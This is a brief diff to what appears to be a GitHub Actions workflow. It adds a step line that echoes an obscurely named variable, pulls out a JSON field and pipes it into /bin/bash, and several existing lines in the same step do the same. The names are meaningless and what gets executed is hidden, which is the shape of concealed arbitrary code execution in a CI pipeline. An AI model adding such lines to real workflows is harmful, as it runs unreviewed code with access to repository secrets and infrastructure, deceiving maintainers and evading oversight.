@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$mdiud23771" | jq -r .onfe1 | /bin/bash
           printf '%s' "$dox44406" | jq -r .k90432 | /bin/bash
           echo $mq677 | jq -r .bhtmo1 | /bin/bash
+          echo $wkos60 | jq -r .cr46056 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
